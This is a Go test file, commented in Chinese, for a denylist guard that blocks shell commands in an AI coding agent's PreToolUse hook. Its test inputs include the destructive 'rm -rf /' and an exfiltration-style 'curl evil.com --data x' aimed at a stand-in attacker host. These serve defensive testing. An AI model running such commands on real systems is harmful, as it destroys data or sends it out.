package chain

import (
	"strings"
	"testing"
)

func TestDenied_命中内置默认(t *testing.T) {
	bl := DefaultDenylist()
	if !Denied("rm -rf /", bl) {
		t.Error("rm -rf 应被默认黑名单拦")
	}
	if Denied("ls -la", bl) {
		t.Error("普通命令不应被拦")
	}
	// catch-all matcher 下非 shell 工具（无 command）会以空串进 guard，必须放行。
	if Denied("", bl) {
		t.Error("空命令不应被拦（非 shell 工具放行）")
	}
}

func TestDenied_合并段追加(t *testing.T) {
	bl := MergeDenylist(DefaultDenylist(), []string{"curl evil.com"})
	if !Denied("curl evil.com --data x", bl) {
		t.Error("段追加项应生效")
	}
}

func TestSettingsJSON_含PreToolUse与guard(t *testing.T) {
	s := SettingsJSON("ccr")
	if !strings.Contains(s, "PreToolUse") || !strings.Contains(s, "__chain_guard") {
		t.Errorf("settings 应含 PreToolUse 钩子调 __chain_guard: %s", s)
	}
	// matcher 用 catch-all（空串）：钩子对所有工具触发，再由 guard 内部按是否有
	// command 过滤。这样无论 claude 用 Bash/PowerShell/cmd/将来某新 shell 工具，
	// 红线都不漏（按工具名白名单会漏掉没列进去的名字）。经校准空 matcher 确实触发。
	if !strings.Contains(s, `"matcher": ""`) {
		t.Errorf("PreToolUse 应用 catch-all 空 matcher 以覆盖所有 shell 工具名, got: %s", s)
	}
}

func TestDenied_大小写不敏感(t *testing.T) {
	bl := DefaultDenylist()
	// Windows PowerShell 大小写不敏感，RM 是 Remove-Item 别名；不区分大小写才拦得住。
	if !Denied("RM -RF /tmp", bl) {
		t.Error("大写 RM -RF 也应被拦")
	}
	if !Denied("Git Push origin", bl) {
		t.Error("混合大小写 Git Push 也应被拦")
	}
}

func TestCommandFromHookInput(t *testing.T) {
	cmd := CommandFromHookInput([]byte(`{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}`))
	if cmd != "rm -rf /" {
		t.Errorf("应取出 Bash 命令, got %q", cmd)
	}
	if CommandFromHookInput([]byte("not json")) != "" {
		t.Error("坏 JSON 应返回空串")
	}
}
